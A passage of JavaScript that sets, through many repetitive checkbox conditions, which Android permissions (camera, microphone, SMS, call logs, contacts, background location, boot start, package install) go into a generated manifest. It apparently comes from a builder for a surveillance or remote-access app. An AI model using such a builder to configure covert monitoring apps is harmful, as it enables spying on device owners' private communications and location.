            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        // if 5 checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }



        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

